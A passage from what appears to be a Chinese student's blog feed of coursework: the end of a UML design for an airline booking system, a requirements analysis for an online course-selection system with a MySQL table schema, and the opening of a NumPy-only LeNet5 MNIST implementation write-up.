aria-hidden="true">image-20230409222120459</figcaption></figure><blockquote><p>→查询已订机票(旅客→系统前端)</p><p>→提交查询请求(系统前端→DAO)</p><p>→执行查询计划(DAO→DB)</p><p>→返回已订机票列表(DB→DAO)</p><p>→传送已订机票列表(DAO→系统前端</p><p>→展示已订机票(系统前端→旅客)</p><p>→选择欲退票对应账单(旅客→系统前端)</p><p>→发起退票请求(系统前端→DAO)</p><p>→查询是否付款及账单金额(DAO→DB)</p><p>→返回账单信息(DB→DAO)</p><p>→传送账单信息(系统前端→DAO)</p><p>→[opt]发起退款(系统前端→支付系统)</p><p>→[opt]退款给用户(支付系统→旅客）</p><p>→[opt]返回退款结果(系统前端→支付系统)</p><p>→展示退票成功消息(系统前端→旅客)</p></blockquote><p>这一部分与用户个人信息管理部分类似。额外的部分主要是账单有已付款和未付款两种状态，如果账单已付款，我们还需要将账单金额退还给用户。</p><h2 id="状态图">状态图</h2><p>状态图与活动图相似，只是顾名思义，状态图更多的强调一个对象在不同情形下的状态变化。</p><p>下面给出管理员整个工作流程的状态图：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210433617962_729_20230409235308064551_965_image-20230409225349414.png" alt="image-20230409225349414"><figcaption aria-hidden="true">image-20230409225349414</figcaption></figure><p>这一部分结合实际比较容易理解。管理员进入系统后可以选择进行个人信息管理，或进行系统其他部分的管理。当进行其他部分管理时均为工作状态。管理员对航班、旅客或账单进行常规的增删改查后，完成工作，注销账号。在已登录状态注销账号进入未登录状态。管理员不管完成工作与否随时可注销账号。</p><h2 id="构件图">构件图</h2><p>构件图通过模块和接口，能够很好的呈现和理清模块之间的依赖关系，有助于实现整个系统的高内聚低耦合。</p><p>圆圈代表接口，连接圆圈的模块实现该接口，包围圆圈的模块依赖该接口。</p><p>下面是整个预订系统的构件图。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210434840176_157_20230409235310195363_408_image-20230409231814194.png" alt="image-20230409231814194"><figcaption aria-hidden="true">image-20230409231814194</figcaption></figure><p>可以看到整个系统的依赖关系还是较为复杂的。一定程度上构件图是对类图依赖关系的强化。</p><h2 id="部署图">部署图</h2><p>部署图描述了一个系统运行时的硬件特点和在这些节点上运行的软件构件。部署图贴近“落地”，关注物理的运行，以及它们之间如何彼此通信。</p><p>下面是该预订系统的部署图。</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E8%BD%AF%E4%BB%B6%E8%AE%BE%E8%AE%A1%E4%BD%9C%E4%B8%9A/20230828210436138065_382_20230409235311789954_391_image-20230409234037704.png" alt="image-20230409234037704"><figcaption aria-hidden="true">image-20230409234037704</figcaption></figure><p>我们的系统是前后端分离的，通过TCP/IP协议进行信息交互。同时采用MariaDB作为数据库。软件开发商需要提供前端WebAPP，以及后端的实现，还要设计数据库模式。硬件上我们需要存储数据信息以及运行应用的服务器，应对高并发我们还要加设防火墙，并设置负载均衡节点。当然，为了让用户取票据和纸质凭据，我们还需要嵌入式系统和打印机。</p><h2 id="总结">总结</h2><p>不同的UML图示有不同的特点和适用场景。以上为各个场景根据不同种类的图示特点选取了不同的描述方式，总体上从各种粒度和各个角度覆盖了整个机票预订系统最需要我们关注的地方，对整个系统有了更加清晰的了解，为敏捷开发，DevOps等活动打下较好的基础。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件工程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>软件工程-需求分析作业</title>
    <link href="/posts/53897/"/>
    <url>/posts/53897/</url>
    
    <content type="html"><![CDATA[<h1 id="在线选课管理系统需求分析">在线选课管理系统需求分析</h1><p>2013599 田佳业</p><h2 id="一引言">一、引言</h2><h3 id="编写目的">编写目的</h3><ul><li><p>对要实现的软件功能做总体描述，帮助判断所规定的软件是否符合当前要求。</p></li><li><p>尽可能的除了在管理日常教学事务层面活动的同时考虑后续各种情况，使系统具有良好的可拓展性。</p></li><li><p>提高开发效率，为成本计划和编制计划进度提供基础。</p></li></ul><h3 id="项目背景">项目背景</h3><p>学校选课信息数据庞杂，且各种限制条件繁多，由教师及管理员手动进行选课信息处理负担较重，且效率极低，耽误正常教学工作的进行。而学生选课系统的应用将使选课管理工作规范化，系统化，程序化，避免选课管理的随意性，提高信息处理的速度和准确性，能够及时，准确，有效的查询和修改选课情况。系统的主要功能是为了方便学校对教师信息、学生基本信息、课程信息、学生成绩录入、修改、查询，提高学校的工作效率。</p><h2 id="二任务概述">二、任务概述</h2><h3 id="任务目标">任务目标</h3><p>本项目所开发的学生选课系统完成学校对学生的选课信息的统计与管理，减少数据错漏的情况，同时也节约人力、物力和财力，告别以往的人工统计。学生在规定选课时间段内在校园网内(特殊时期可开放外网访问)登录选课系统完成选课的申请，而学校可以方便地对系统进行管理和控制，提高工作效率。方便学生、老师、教务处使用，学生可以在线查看可选课程信息、在线选课、补选、退选等，老师可以填写和修改自己的课程信息，查询自己的课程人数、课程信息（包括开课时间、地点、开课方式），教务处可以对整个系统进行管理（包括系统管理、用户管理、课程管理）。</p><h3 id="用户特点">用户特点</h3><ul><li><p>管理员</p><p>具备整个系统的所有权限，如可在选课前中后对课程信息进行调整，指定教师和学生的权限，调整筛选策略等。</p></li><li><p>教师</p><p>具备自己所教授的课程的管理权限。如录入课程信息等。</p></li><li><p>学生</p><p>学生需要在指定时间选课，通常情况下登录系统时间较为集中，可针对自己的课表进行安排。</p></li></ul><h3 id="假定和约束">假定和约束</h3><h4 id="假定">假定</h4><ul><li><p>用户：假定该选课系统主要服务于学生和教师，其中学生可登录系统进行选课和查看课程表，教师可登录系统进行课程管理和成绩管理。其他外来人员能够通过通过验证码的方式进行屏蔽。</p></li><li><p>性能：选课系统有较高性能要求，例如响应时间、并发处理能力、系统可用性等。</p></li><li><p>数据完整性：假定该选课系统能够通过数据备份，定期检查等方式保证所处理的数据的完整性和准确性，以避免数据错误和损坏。</p></li><li><p>用户交互：假定用户可能通过手机或电脑进入浏览器选课。</p></li><li><p>拓展性：假定学校根据需要可对选课系统进行调整，如调整选课时间，二学位课和主修课对换等。</p></li></ul><h4 id="约束">约束</h4><ul><li><p>项目需要在学生选课前15天(8月16日前)开发完成，至少需满足本文档下述的全部需求。</p></li><li><p>项目以chrome内核浏览器显示界面为UI标准，能够在PC端和移动端完整显示。不对IE浏览器UI显示做要求，但需要在IE浏览器能够正常使用所有功能。</p></li><li><p>项目总预算xx万元，其他事宜详见项目合同。</p></li></ul><h2 id="三业务描述">三、业务描述</h2><h3 id="系统总业务流程图及其描述">系统总业务流程图及其描述</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%BD%9C%E4%B8%9A/20230828210646449880_738_20230409235202901387_783_image-20230227190111733.png" alt="image-20230227190111733"><figcaption aria-hidden="true">image-20230227190111733</figcaption></figure><ul><li><p>学生</p><p>登录系统，查看课表或进行选课。选课分为预选、正选和补退选三个阶段。有辅修/双学位的学生还需要进行辅修选课。</p></li><li><p>教师</p><p>登录系统，录入课程信息，或查看自己所教授课程的选课情况。</p></li><li><p>管理员</p><p>查看或修改用户的信息或权限。以及处理选课过程中的数据，并负责处理教师修改信息相关的申请。</p></li></ul><h3 id="各个子业务流程图及其描述">各个子业务流程图及其描述</h3><h4 id="学生选课">学生选课</h4><p>下面以主修选课为例，说明选课子业务的流程：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%BD%9C%E4%B8%9A/20230828210649539046_353_20230409235205419738_553_image-20230302191509591.png" alt="image-20230302191509591"><figcaption aria-hidden="true">image-20230302191509591</figcaption></figure><p>选课需要在对应时间选课，并根据学生点击选课入口进行对应课程的子入口。学生课根据课程序号，课程名称等进行课程的搜索，点击“选课”按钮进行选课。若已选过，应当显示“退课”。然后进行条件初步判断，若满足条件选课成功，返回分入口。</p><h4 id="其他子业务">其他子业务</h4><p>其他子业务均为单流程，满足对应业务各自约束即可。</p><h2 id="四数据需求">四、数据需求</h2><h3 id="数据需求描述">数据需求描述</h3><ol type="1"><li>学生信息：包括学生的个人基本信息：学号、姓名、性别、入学时间、学院。</li><li>课程信息：包括课程的基本信息：课程编号（内部唯一ID)、课程代号（前端展示)、课程名称、课程学分、授课教师、上课时间、课程选课人数上限。</li><li>选课信息：包括学生选课的信息：选课记录编号、学生学号、课程编号、选课时间。</li><li>教师信息：包括教师的基本信息：教师编号、姓名、性别、职称。</li></ol><h3 id="数据流图">数据流图</h3><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%BD%9C%E4%B8%9A/20230828210650750888_483_20230409235207392543_716_image-20230307231017064.png" alt="image-20230307231017064"><figcaption aria-hidden="true">image-20230307231017064</figcaption></figure><h3 id="数据字典">数据字典</h3><p>下面采用数据库表的方式描述项目主要流程中使用的数据字典：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B-%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90%E4%BD%9C%E4%B8%9A/20230828210652278097_565_20230409235209631863_631_image-20230308091548193.png" alt="image-20230308091548193"><figcaption aria-hidden="true">image-20230308091548193</figcaption></figure><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-0ffu3rlmrh9u6a"></i><span>sql</span><div class="collapse show" id="collapse-0ffu3rlmrh9u6a"><pre><code class="hljs sql"><span class="hljs-keyword">SET</span> NAMES utf8mb4;<span class="hljs-keyword">SET</span> FOREIGN_KEY_CHECKS <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;<span class="hljs-comment">-- ----------------------------</span><span class="hljs-comment">-- Table structure for Course</span><span class="hljs-comment">-- ----------------------------</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `Course`;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `Course` (  `CourseID` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `CourseCode` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `CourseName` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Credits` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Teacher` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `MaxCapccity` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `StartWeek` tinyint <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `EndWeek` tinyint <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Place` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_0900_ai_ci;<span class="hljs-comment">-- ----------------------------</span><span class="hljs-comment">-- Table structure for Select</span><span class="hljs-comment">-- ----------------------------</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `<span class="hljs-keyword">Select</span>`;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `<span class="hljs-keyword">Select</span>` (  `SelectID` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `StudentID` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `CourseID` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `SelectTime` datetime <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_0900_ai_ci;<span class="hljs-comment">-- ----------------------------</span><span class="hljs-comment">-- Table structure for Student</span><span class="hljs-comment">-- ----------------------------</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `Student`;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `Student` (  `studentID` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Name` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Gender` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Age` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Institute` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_0900_ai_ci;<span class="hljs-comment">-- ----------------------------</span><span class="hljs-comment">-- Table structure for Teacher</span><span class="hljs-comment">-- ----------------------------</span><span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">EXISTS</span> `Teacher`;<span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> `Teacher` (  `TeacherID` <span class="hljs-type">int</span> <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `TeacherName` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Gender` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>,  `Title` <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>) <span class="hljs-keyword">DEFAULT</span> <span class="hljs-keyword">NULL</span>) ENGINE<span class="hljs-operator">=</span>InnoDB <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8mb4 <span class="hljs-keyword">COLLATE</span><span class="hljs-operator">=</span>utf8mb4_0900_ai_ci;<span class="hljs-keyword">SET</span> FOREIGN_KEY_CHECKS <span class="hljs-operator">=</span> <span class="hljs-number">1</span>;</code></pre></div></div><p>注意:</p><p>1.由于选课系统会频繁进行数据表的插入删除，设置外键会使数据库性能下降，故需将异常处理交由软件处理，以加快正常情况下的选课相应速度。</p><p>2.数据表及数据表项可根据实际开发进行添加，但以上所列出为必需项。</p><h2 id="五功能需求">五、功能需求</h2><h3 id="功能划分">功能划分</h3><h4 id="公共功能">公共功能</h4><ul><li><p>登录</p></li><li><p>查看当前选课状态</p></li><li><p>查看课程信息</p></li></ul><h4 id="学生">学生</h4><ul><li><p>选课</p></li><li><p>退课</p></li><li><p>查看可选和已选课程</p></li></ul><h3 id="教师">教师</h3><ul><li><p>发布课程信息</p></li><li><p>请求修改课程信息</p></li></ul><h4 id="管理员">管理员</h4><ul><li><p>录入和修改用户信息</p></li><li><p>选课结果汇总</p></li><li><p>筛选选课结果</p></li></ul><h3 id="功能描述">功能描述</h3><h4 id="登录">登录</h4><p>用户输入用户名和密码登录选课系统，系统根据输入的信息验证用户身份，并进入相应的用户界面。</p><h4 id="查看当前选课状态">查看当前选课状态</h4><p>在选课系统中查看当前各个课程选课人数（<strong>不包含具体选课的学生信息</strong>)</p><h4 id="查看课程信息">查看课程信息</h4><p>在选课系统中查看课程的详细信息，包括课程名称、授课教师、上课时间、上课地点、学分等。</p><h4 id="选课">选课</h4><p>学生可以在选课系统中选择需要选修的课程，并提交选课请求。系统会根据当前选课人数进行相应，并在不同选课阶段之间根据筛选条件进行进行审核，审核通过后自动为学生添加选课记录。</p><h4 id="退课">退课</h4><p>学生可以在选课系统中查看已选课程，并选择需要退选的课程。提交退课请求后，系统会自动删除相应的选课记录。</p><h4 id="查看可选和已选课程">查看可选和已选课程</h4><p>学生可查看当前选课阶段可选和已选的课程，以列表方式呈现。</p><h4 id="发布课程信息">发布课程信息</h4><p>教师可以在选课系统中发布课程信息，包括课程名称、授课教师、上课时间、上课地点、学分等。发布后，学生可以在选课系统中进行选课操作。</p><h4 id="请求修改课程信息">请求修改课程信息</h4><p>当教师需要对已发布的内容进行修改，如修改上课地点，修改可容纳人数等。</p><h4 id="录入和修改用户信息">录入和修改用户信息</h4><p>管理员可以在选课系统中录入和修改学生和教师的个人信息，包括姓名、学号、联系方式、职称、专业等。</p><h4 id="选课结果汇总">选课结果汇总</h4><p>管理员可以在选课系统中查看所有学生的选课情况，并对选课结果进行汇总统计，包括已选课程、未选课程和已退课程。<strong>注意：需要按照课程和学生两种维度分别给出结果汇总。</strong></p><h4 id="筛选选课结果">筛选选课结果</h4><p>管理员可以在选课系统中对选课结果进行筛选和分析，根据不同的条件进行查询，包括学生学号、课程编号、成绩等级等。同时管理员可以对查询结果进行导出和打印。</p><h2 id="六非功能需求">六、非功能需求</h2><ol type="1"><li>性能：由于正选阶段学生选课时间集中，选课系统应具有高性能，能够支持大量的并发用户访问，并快速响应用户的请求，避免出现系统瓶颈或崩溃现象。即便确实出现了瓶颈，也应及时进行自发控制，避免系统崩溃。</li><li>可靠性：系统应具有高可靠性，保证数据的完整性、安全性和可用性，有数据库日志及备份和恢复功能。</li><li>安全性：系统应具有高安全性，对用户数据进行保护，包括用户个人信息和选课记录等敏感数据，确保数据不被窃取、篡改或损坏。</li><li>易用性：系统应具有高易用性，界面友好、操作简单，学生可以快速地进行选课和退课等操作，避免学生使用过程中出现操作困难或错误，<strong>特别注意避免出现误容易出现误导操作的UI布局或文字描述</strong>。管理员页面由于需显示数据较多，需要采用较为简洁的界面，利于管理和维护。</li><li>可扩展性：系统应具有高可扩展性，能够灵活地添加新的功能和模块，以适应不同阶段或特殊/紧急状态的需求。</li><li>软件质量：系统应具有高软件质量，包括高代码质量、高稳定性、高可维护性、高可测试性和高可重用性等。同时，系统应具有高可靠性、高安全性和高可用性等。<strong>特别的，代码需要有明确的功能描述注释及负责人信息，确保可追溯</strong>。</li><li>兼容性：系统应具有高兼容性，能够在不同的操作系统、设备上运行，在Chrome和Firefox上均需保证界面正确和功能完全可用，IE浏览器需保证界面可见和功能完全可用，确保用户能够方便地访问和使用系统。</li></ol><h2 id="七系统要求">七、系统要求</h2><p>需部署在CentOS7.7（或基于此二次开发的兼容系统)，使用docker进行环境和打包，并提供需挂载的数据。</p><p>服务器2核CPU，带宽4M，内存8GB。</p><p>Docker使用LAMP环境，具体版本要求：</p><blockquote><p>PHP&gt;=7.4且&lt;9.0</p><p>MySQL&gt;=8.0</p><p><strong>务必不要使用5.x版本的Mysql</strong></p><p>Apache&gt;=2.4.6</p></blockquote><p>使用PHP框架或JSP框架开发均可。</p>]]></content>
    
    
    <categories>
      
      <category>作业</category>
      
    </categories>
    
    
    <tags>
      
      <tag>软件工程</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Lenet5 手写数字分类</title>
    <link href="/posts/42585/"/>
    <url>/posts/42585/</url>
    
    <content type="html"><![CDATA[<h1 id="lenet5-手写数字分类">Lenet5 手写数字分类</h1><p>2013599 田佳业</p><h2 id="实验要求">实验要求</h2><p>用Python实现LeNet5来完成对MNIST数据集中10个手写数字的分类。不使用PyTorch或TensorFlow框架。</p><h2 id="网络结构">网络结构</h2><p>Lenet5的提出在当时主要依靠人工进行特征提取的时代无疑是划时代的。下面阐述原论文中Lenet5得到结构，并同时说明在此次作业中结合当前深度学习发展为加快训练速度和提高准确率做出的改进。</p><p>关于维度表示的说明：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210830689024_823_20230305200443272609_409_image-20230108195305664.png" alt="image-20230108195305664"><figcaption aria-hidden="true">image-20230108195305664</figcaption></figure><p>整体的结构图如下所示：</p><figure><img src="https://raw.githubusercontent.com/Lunaticsky-tql/blog_articles/main/Lenet5%20%E6%89%8B%E5%86%99%E6%95%B0%E5%AD%97%E5%88%86%E7%B1%BB/20230828210831714613_857_20230305200444819985_702_image-20230108193022548.png" alt="image-20230108193022548"><figcaption aria-hidden="true">image-20230108193022548</figcaption></figure><ul><li><p>C1 卷积层。</p><p>滤波器（6,1,5,5)，步长为 1，无 padding，即输入通道数为1，滤波器数量（等于输出通道数）为 6，大小为5×5 使用偏置项 b。输出图像大小变为 6 × 28 × 28 。</p><blockquote><p>本次实验中由于图像是28*28的，为尽可能少的改变网络结构，将其进行padding，resize到32*32。</p></blockquote></li><li><p>S2 池化层</p><p>滤波器 大小 2×2，步长 为2，无 padding，输出矩阵大小为 14×14×6。 &gt;论文中采用的是平均池化，本次实验中采用最大池化，更能有效的提取关键特征。</p></li><li><p>C3 卷积层</p><p>滤波器 (16,6,5,5)，输出图像变为 16 × 5 × 5。</p><blockquote><p>论文中 C3卷积层的每个滤波器只与上一层中指定的通道进行连接。LeCun认为这样能减少参数数量的同时破坏不同核的对称性，希望不同的核去关注互补的特征。这种策略在现在看来事实上是一种静态的dropout策略，通常用于缓解过拟合。在Pytorch上实验发现会显著使准确率下降，因此不对其进行实现。</p></blockquote></li><li><p>S4 池化层</p><p>其设置与 S2 相同。 输出图像大小变为 5 × 5 × 16。</p></li><li><p>C5-C6 全连接层</p><p>其实现与一般的神经网络相同。比如C5图像大小仅为 5 ×5，与滤波器大小相同，因此该层与将输入拉平后进行全连接完全等价。</p></li><li><p>输出层</p><blockquote><p>论文中采用了欧氏径向基函数（RBF）输出层。RBF是将计算结果和标准图案进行像素级对比，即预先绘制数字的ASCII点阵图，然后计算输入向量和其欧式距离。这种方法使神经网络的输出有了一定的“可解释性”，但还是局限于特征工程，实现复杂且效果并不比普通的softmax变换好。</p></blockquote></li><li><p>激活和损失函数</p><blockquote><p>论文中采用类似于sigmoid的tanh函数作为激活函数，本次实验采用tanh作为激活函数，并在最后使用softmax归一，采用交叉熵误差作为损失函数。</p></blockquote></li></ul><p>体现在代码中，整个网络的结构定义如下:</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-xt6h28lmrh9u64"></i><span>python</span><div class="collapse show" id="collapse-xt6h28lmrh9u64"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyLeNet5</span>:    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):        self.conv1 = layers.Conv2d(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>)        self.relu1 = layers.ReLu()        self.pool1 = layers.MaxPool2d((<span class="hljs-number">2</span>, <span class="hljs-number">2</span>))        self.conv2 = layers.Conv2d(<span class="hljs-number">6</span>, <span class="hljs-number">16</span>, <span class="hljs-number">5</span>)        self.relu2 = layers.ReLu()        self.pool2 = layers.MaxPool2d((<span class="hljs-number">2</span>, <span class="hljs-number">2</span>))        self.fc1 = layers.Linear(<span class="hljs-number">16</span> * <span class="hljs-number">5</span> * <span class="hljs-number">5</span>, <span class="hljs-number">120</span>)        self.relu3 = layers.ReLu()        self.fc2 = layers.Linear(<span class="hljs-number">120</span>, <span class="hljs-number">84</span>)        self.relu4 = layers.ReLu()        self.fc3 = layers.Linear(<span class="hljs-number">84</span>, <span class="hljs-number">10</span>)</code></pre></div></div><h3 id="代码细节">代码细节</h3><h4 id="准备工作">准备工作</h4><p>代码整体仿照Pytorch的形式进行编写，但由于没有Pytorch的自动求导机制，反向传播与参数更新方面必然与其有所差距。</p><p>首先进行数据获取和处理，定义模型和优化器：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-c7rfqzlmrh9u64"></i><span>python</span><div class="collapse show" id="collapse-c7rfqzlmrh9u64"><pre><code class="hljs python">model = MyLeNet5()mnist_train = datasets.MNIST(<span class="hljs-string">'./data/MNIST/raw'</span>, train=<span class="hljs-literal">True</span>)mnist_test = datasets.MNIST(<span class="hljs-string">'./data/MNIST/raw'</span>, train=<span class="hljs-literal">False</span>)mnist_train, mnist_val = split(mnist_train, [<span class="hljs-number">54000</span>, <span class="hljs-number">6000</span>])train_loader = DataLoader(mnist_train, batch_size=<span class="hljs-number">120</span>, shuffle=<span class="hljs-literal">True</span>)val_loader = DataLoader(mnist_val, batch_size=<span class="hljs-number">120</span>, shuffle=<span class="hljs-literal">False</span>)test_loader = DataLoader(mnist_test, batch_size=<span class="hljs-number">1</span>, shuffle=<span class="hljs-literal">False</span>)loss_fn = loss.CrossEntropyLoss()optimizer = optim.Adam(lr=<span class="hljs-number">1e-3</span>)</code></pre></div></div><p>与Pytorch类似，DataLoader实现了迭代器，如下所示：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-paoksclmrh9u64"></i><span>python</span><div class="collapse show" id="collapse-paoksclmrh9u64"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">__iter__</span>(<span class="hljs-params">self</span>):    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(self.num_batches):        batch_indices = self.indices[i * self.batch_size:(i + <span class="hljs-number">1</span>) * self.batch_size]        batch_data = self.data[batch_indices]        batch_labels = self.labels[batch_indices]        <span class="hljs-keyword">yield</span> batch_data, batch_labels</code></pre></div></div><p>交叉熵损失函数如下所示。为避免取对数时数据过小除0，将预测数据过一遍softmax进行归一化：</p><div class="code-wrapper"><i class="fa fa-chevron-down" type="button" data-toggle="collapse" data-target="#collapse-mo0gfwlmrh9u64"></i><span>python</span><div class="collapse show" id="collapse-mo0gfwlmrh9u64"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">CrossEntropyLoss</span>(<span class="hljs-title class_ inherited__">object</span>):    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):        self.<span class="hljs-built_in">input</span> = <span class="hljs-literal">None</span>        self.output = <span class="hljs-literal">None</span>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params">self, y_pred, y</span>):        <span class="hljs-comment"># y_pred: (N, C_out)</span>        <span class="hljs-comment"># y: (N, 1)</span>        <span class="hljs-comment"># N = y_pred.shape[0]</span>        <span class="hljs-comment"># self.input = y_pred</span>        <span class="hljs-comment"># self.output = np.mean(-np.log(y_pred[range(N), list(y)]))</span>        <span class="hljs-comment"># grad = y_pred</span>        <span class="hljs-comment"># grad[range(N), list(y)] -= 1</span>        <span class="hljs-comment"># grad /= N</span>        <span class="hljs-comment"># return self.output, grad</span>        N = y_pred.shape[<span class="hljs-number">0</span>]        ex = np.exp(y_pred)        sumx = np.<span class="hljs-built_in">sum</span>(ex, axis=<span class="hljs-number">1</span>)        loss = np.mean(np.log(sumx)-y_pred[<span class="hljs-built_in">range</span>(N), <span class="hljs-built_in">list</span>(y)])        grad = ex/sumx.reshape(N, <span class="hljs-number">1</span>)        grad[<span class="hljs-built_in">range</span>(N), <span class="hljs-built_in">list</span>(y)] -= <span class="hljs-number">1</span>        grad /= N        <span class="hljs-keyword">return</span> loss, grad</code></pre></div></div><p>优化算法上，论文中使用的是随机梯度下降算法，为加快收敛速度，对当前流行的Adam算法进行了学习和实现。</p><p>Adam是2015年提出的新方法。它的理论有些复杂，直观地讲，就是融合了Momentum和AdaGrad的方法，也就是说，结合“速度”和“加速度”进行方向向量判断，同时具有AdaGrad学习率递减的特征。通过组合前面两个方法的优点，有望实现参数空间的高效搜索。此外，进行超参数的“偏置校正”也是Adam的特征。</p><p>首先计算历史梯度的一阶指数平滑值，用于得到带有动量的梯度值 <span class="math display">\[m_t=\beta_1^t m_{t-1}+\left(1-\beta_1^t\right) g\]</span>然后计算历史梯度平方的一阶指数平滑值，用于得到每个权重参数的学习率权重参数<span class="math display">\[v_t=\beta_2^t 